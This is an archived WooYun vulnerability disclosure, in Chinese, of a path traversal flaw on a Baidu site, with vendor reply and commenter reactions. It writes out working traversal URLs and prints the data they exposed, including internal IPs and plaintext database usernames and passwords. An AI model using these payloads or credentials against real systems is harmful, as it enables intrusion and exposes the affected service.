{"id": 86659, "wybug_id": "wooyun-2016-0190419", "wybug_title": "百度某站点任意文件遍历(泄漏多个数据库帐号密码)", "wybug_corp": "百度", "wybug_author": "lijiejie", "wybug_date": "2016-03-29 16:02", "wybug_open_date": "2016-05-13 20:00", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-13：\t细节向公众公开  简要描述： 百度某站点任意文件遍历(泄漏数据库帐号密码等) 详细说明：  \nhttp://dz.baidu.com/en/..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\/etc/sysconfig/network-scripts/ifcfg-eth1\n可以读取任意本地文件。\n\n   漏洞证明：  \nDEVICE=eth1BOOTPROTO=staticIPADDR=10.26.186.23NETMASK=255.255.255.0ONBOOT=yes\n得到IP地址是10.26.186.23。再读取/proc/self/environ:\nMANPATH=:/usr/share/baidu/manHOSTNAME=tc-dev-light01.tc.baidu.comTERM=linuxSHELL=/bin/bashHISTSIZE=1000SSH_CLIENT=10.48.50.43 43745 22SSH_TTY=/dev/pts/0USER=workLD_LIBRARY_PATH=/home/op/opbin/optool/lib:LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.sh=01;32:*.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35:SUDO_USER=zhaojianqiSUDO_UID=194560OPHOME=/home/opOPTOOL=/home/op/opbin/optoolMAIL=/var/spool/mail/zhaojianqiPATH=/home/op/opbin/optool/bin:/home/op/opbin/optool/bin:/usr/kerberos/bin:/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/usr/share/baidu/bin:/opt/bin:/home/opt/bin:/DoorGod/bin:/opt/bin:/home/opt/binPWD=/home/work/php/sbinINPUTRC=/etc/inputrcEDITOR=vimLANG=en_USSUDO_COMMAND=/bin/bashSHLVL=5HOME=/home/workLOGNAME=workSSH_CONNECTION=10.48.50.43 43745 10.26.186.13 22LESSOPEN=|/usr/bin/lesspipe.sh %sPKG_CONFIG_PATH=/home/op/opbin/optool/lib/pkgconfig:/home/op/opbin/optool/lib/pkgconfig:SUDO_GID=100000G_BROKEN_FILENAMES=1_=/home/work/php/bin/php-cgiFPM_SOCKETS=/home/work/php/tmp/php-fpm.sock\n得到主机名： HOSTNAME=tc-dev-light01.tc.baidu.com。.bash_history文件是存在的：\nhttp://dz.baidu.com/en/..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\/home/work/.bash_history\n历史命令泄漏了MySQL密码：\n/home/work/mysql/bin/mysql -hsh01-dba-chunlei-lapp-01.sh01 -P5100 -pGOGZ7Wpr8wrjHS6g -Dlightpay -ulightpay_r  --default-character-set=utf8\n源代码中还泄漏了数据库配置信息，有较多的数据库密码：\nhttp://dz.baidu.com/en/..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\/home/work/phpui/conf/bdDBProxyConfig.class.php  /**     * DBProxy集群的机器列表、访问集群时所用的用户名、密码、端口号、失败重试次数     * @var array     */    static $arrDBProxyServer = array(        self::DBPROXY_OPENPLATFORM_INDEX => array(    //open-platform dbproxy集群            'username' => 'developer_w',            'password' => 'v60KOStx8cMQrv60',            'port' => 6014,            'jx' => array(                '10.46.7.20',                '10.46.7.20',            ),            'tc' => array(                '10.42.8.18',                '10.42.8.18',            ),        ),        self::DBPROXY_OPENPLATFORM_READONLY_INDEX => array(  //open-platform dbproxy集群            'username' => 'openplatform_r',            'password' => 'oY3DHhmW1BFfkUYy',            'port' => 5352,            'jx' => array(                '10.202.95.49',            ),            'tc' => array(                '10.202.95.49',            ),        ),其余省略\n   修复方案：  正确处理path   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-03-29 19:53 厂商回复： 感谢对百度安全的关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-29 16:08 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:4773 漏洞数:367        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  看标题就好厉害啊    \n     2016-03-29 16:08 |    \t\tLooke \t\t\t( 普通白帽子  |\t\t\t        Rank:1273 漏洞数:158        | Shell)\t\t \n  这节奏就是快啊    \n     2016-03-29 16:09 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:8        | 带我玩)\t\t \n  看标题就好厉害啊     \n     2016-03-29 16:09 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这是为啥，为啥啊？？    \n     2016-03-29 16:11 |    \t\tnetwind \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:41        | 挖掘漏洞为乐趣)\t\t \n  lijiejie进入开挂模式了    \n     2016-03-29 16:12 |    \t\t举起手来 \t\t\t( 核心白帽子 |\t\t\t        Rank:1811 漏洞数:188        | 准备好，举起手来！)\t\t \n  越来越看不懂了，什么奇葩都有    \n     2016-03-29 16:12 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:925 漏洞数:80        | 哈！躁起来！)\t\t \n  加入tangscan豪华套餐    \n     2016-03-29 16:34 |    \t\t习总夸我好青年 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 刚来的,请多关照)\t\t \n  lijiejie进入开挂模式了    \n     2016-03-29 16:37 |    \t\tJutaZ \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:13        | 少壮不努力老大徒伤悲)\t\t \n  必有神器出世    \n     2016-03-29 16:44 |    \t\tArrow \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:14        )\t\t \n  开挂了今天    \n     2016-03-29 16:51 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:244 漏洞数:91        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  李姐姐开挂了。。    \n     2016-03-29 18:11 |    \t\t雅柏菲卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:1285 漏洞数:257        | 雙魚座聖鬥士雅柏菲卡)\t\t \n  李姐姐好棒。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}